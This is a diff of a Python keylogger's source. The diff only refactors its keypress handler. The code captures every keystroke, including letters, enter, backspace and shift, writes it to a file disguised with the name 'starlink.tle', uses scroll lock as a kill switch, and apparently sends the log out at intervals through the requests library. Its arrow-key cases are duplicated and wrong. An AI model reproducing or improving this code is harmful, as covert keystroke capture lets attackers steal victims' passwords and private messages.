@@ -2,7 +2,6 @@ import json
 import threading
 import requests
 import pynput
-from pynput.keyboard import Key, KeyCode
 import subprocess
 import sys
 
@@ -24,10 +23,10 @@ sending_interval = 1
 data = 'starlink.tle'
 
 
-def process_keypress(key : Key|KeyCode|None) -> bool|None:
+def process_keypress(key):
     global data
     
-    if key == None:
+    if key is None:
         return
     
     if debug_logging:
@@ -36,34 +35,34 @@ def process_keypress(key : Key|KeyCode|None) -> bool|None:
     # Controler key pressed
     try:
         txt = ''
-        if isinstance(key, Key):
+        if isinstance(key, pynput.keyboard.Key):
             match key:
-                case Key.enter:
+                case pynput.keyboard.Key.enter:
                     txt = '\n'
-                case Key.space:
+                case pynput.keyboard.Key.space:
                     txt = ' '
-                case Key.tab:
+                case pynput.keyboard.Key.tab:
                     txt = '\t'
-                case Key.backspace:
+                case pynput.keyboard.Key.backspace:
                     txt = '[BKSP]'
-                case Key.delete:
+                case pynput.keyboard.Key.delete:
                     txt = '[DEL]'
-                case Key.right:
+                case pynput.keyboard.Key.right:
                     txt = '[ARR_RIGHT]'
-                case Key.left:
+                case pynput.keyboard.Key.left:
                     txt = '[ARR_LEFT]'
-                case Key.left:
+                case pynput.keyboard.Key.left:
                     txt = '[ARR_UP]'
-                case Key.left:
+                case pynput.keyboard.Key.left:
                     txt = '[ARR_DOWN]'
-                case Key.shift:
+                case pynput.keyboard.Key.shift:
                     txt = '[SHIFT]'
-                case Key.caps_lock:
+                case pynput.keyboard.Key.caps_lock:
                     txt = '[CAPS]'
-                case Key.scroll_lock: # kill switch
+                case pynput.keyboard.Key.scroll_lock: # kill switch
                     if kill_switch:
                         return False
-        elif isinstance(key, KeyCode): # Letter pressed
+        elif isinstance(key, pynput.keyboard.KeyCode): # Letter pressed
             txt = key.char
         else:
             return
